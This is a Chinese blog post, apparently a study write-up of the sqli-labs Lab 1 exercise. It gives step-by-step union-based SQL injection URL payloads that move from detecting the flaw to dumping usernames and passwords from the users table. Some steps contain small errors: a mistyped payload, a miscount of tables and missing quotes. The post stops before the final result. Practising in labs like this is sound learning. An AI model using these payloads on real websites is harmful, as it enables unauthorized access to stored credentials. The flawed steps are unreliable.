---
layout: post
title: sql基础学习-sqli hub
subtitle:
date: 2026-07-28 18:00
author: author
tags:
  - sql注入
---
# lab1

![[Pasted image 20260729171913.png]]

## 判断是否存在sql注入

打开之后能够知道是要用参数“id”作为注入参数，然后先尝试注入

> ?id=1'

来判断该界面是否存在sql注入（这是sql注入的实验，说明一定会有sql注入这个漏洞），现在模拟的是平时的场景。

注入后发现出现错误：

![[Pasted image 20260729172110.png]]

## 注入类型判断

接下来尝试注释**闭合sql**

> ?id=1' --+

用于注释后面的单引号和 SQL 内容。

得到了我的登录账号和我的密码：Dumb

![[Pasted image 20260729172334.png]]

页面恢复正常，同时给了我一个用户名和密码。基本可以确认是单引号字符型注入

## 使用 ORDER BY 判断字段数量

依次使用

```url
?id=1' order by 1 --+
2
3
4
```

发现行数为4时报错，于是得到信息：字段数量为3

## 判断union显示位置

使用明显错误的id值来做这个判断

```url
?id=-1' union select 1,2,3--+
```

页面显示2、3，说明第2、3列能够在网页中显示

## 获取数据库基本信息

使用

```url
?id=-1' union select 1,database(),version()--+
```

得到数据库名为security和其他几个

# 查询 security 数据库中的表

使用

```url
?id=-1' union select 1.group_concat(table_name),3 from information_schema.tables where table_schema='security'--+
```

- information_schema：`information_schema` 是 **MySQL自带的系统数据库**。它里面保存了整个MySQL服务器的元数据（Metadata）。

- group_concat()：这是 MySQL 的一个**聚合函数**。可以把多行数据拼成一行字符串

得到三个结果：emails,referers,uagents,users

我们的目标是users。

## 查询 users 表的字段

使用

```url
?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users'--+
```

得到结果:id 、password、user

## 查询 users 表中的数据

使用

```url
?id=-1 union select 1,group_concat(username,0x3a,password),3 from security.users--+
```
得到最终结果：

- 0x3a：冒号`:`的十六进制形式。